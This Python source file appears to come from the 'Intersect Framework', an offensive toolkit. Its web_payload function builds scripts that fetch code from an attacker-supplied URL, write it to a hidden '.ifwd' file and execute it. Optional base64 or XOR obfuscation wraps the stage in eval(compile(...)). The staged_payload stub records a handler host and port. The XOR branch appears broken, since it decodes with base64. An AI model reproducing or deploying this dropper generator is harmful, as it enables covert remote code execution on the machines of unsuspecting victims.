#!/usr/bin/python
# Intersect Framework (c) 2012

import core
import os, sys
import base64

New_Payloads = ("Scripts/Payloads/") 
Payload_Templates = ("src/Templates/Payloads")


def web_payload(url, lfile, encoding=None):
    core.status("generating Intersect payload: ")
    core.info("Download URL: %s" % url)
    core.info("Output File: %s" % New_Payloads+lfile)
    
    if encoding == "b64":
        core.info("Encoding: Base64")
        plaintext =("""u = urllib2.urlopen('%s')
fin = open('.ifwd', 'w')
fin.write(u.read())
fin.close()
if os.path.exists('.ifwd'):
    subprocess.call(['python', '.ifwd'])
""" % url)

        encoded = base64.b64encode(plaintext)
        try:
            fout = open(New_Payloads+lfile, "w")
            fout.write("#!/usr/bin/python")
            fout.write("\nimport urllib2")
            fout.write("\nimport os, sys")
            fout.write("\nimport subprocess")
            fout.write("\nimport base64")
            fout.write("\n\nchunk = '%s'" % encoded)
            fout.write("\nbuild = base64.b64decode(chunk)")
            fout.write("\neval(compile(build,'<string>', 'exec'))")
            fout.close()    
        except:
            core.warning("error writing %s to %s directory!" % (lfile, New_Payloads))
            sys.exit(0)

        if os.path.exists(New_Payloads+lfile):
            core.status("Intersect payload built!")
            core.status("Location: Scripts/Payloads/%s" % lfile)
        else:
            core.warning("payload did not save correctly. try again!")
            sys.exit(0)
            
    elif encoding == "xor":
        core.info("Encoding: XOR")
        plaintext =("""u = urllib2.urlopen('%s')
fin = open('.ifwd', 'w')
fin.write(u.read())
fin.close()
if os.path.exists('.ifwd'):
    subprocess.call(['python', '.ifwd'])
""" % url)

        encoded = core.xor(plaintext, 'qxi*!sxx()!;X')
        try:
            fout = open(New_Payloads+lfile, "w")
            fout.write("#!/usr/bin/python")
            fout.write("\nimport urllib2")
            fout.write("\nimport os, sys")
            fout.write("\nimport subprocess")
            fout.write("\nimport base64")
            fout.write("\n\nchunk = '%s'" % encoded)
            fout.write("\nbuild = base64.b64decode(chunk)")
            fout.write("\neval(compile(build,'<string>', 'exec'))")
            fout.close()    
        except:
            core.warning("error writing %s to %s directory!" % (lfile, New_Payloads))
            sys.exit(0)

        if os.path.exists(New_Payloads+lfile):
            core.status("Intersect payload built!")
            core.status("Location: Scripts/Payloads/%s" % lfile)
        else:
            core.warning("payload did not save correctly. try again!")
            sys.exit(0)
            
    elif encoding is None:
        core.info("Encoding: None")
        try:
            fout = open(New_Payloads+lfile, "w")
            fout.write("#!/usr/bin/python")
            fout.write("\nimport urllib2")
            fout.write("\nimport os, sys")
            fout.write("\nimport subprocess")
            fout.write("\nimport base64")
            fout.write("\nu = urllib2.urlopen('%s')" % url)
            fout.write("\nfin = open('.ifwd', 'w')")
            fout.write("\nfin.write(u.read())")
            fout.write("\nfin.close()")
            fout.write("\nif os.path.exists('.ifwd'):")
            fout.write("\n    subprocess.call(['python', '.ifwd'])")
            fout.close()
        except:
            core.warning("error writing %s to %s directory!" % (lfile, New_Payloads))
            sys.exit(0)

        if os.path.exists(New_Payloads+lfile):
            core.status("Intersect payload built!")
            core.status("Location: Scripts/Payloads/%s" % lfile)
        else:
            core.warning("payload did not save correctly. try again!")
            sys.exit(0)
            
            
def staged_payload(host, port, payload, encoding=None):
    core.status("Generating Intersect payload: ")
    core.status("Handler Host: %s" % host)
    core.status("Handler Port: %s" % port)
    
    if encoding == "b64":
        core.status("Encoding: Base64")
        
    elif encoding == "xor":
        core.status("Encoding: XOR")
        
    elif encoding is None:
        core.status("Encoding: None")
        
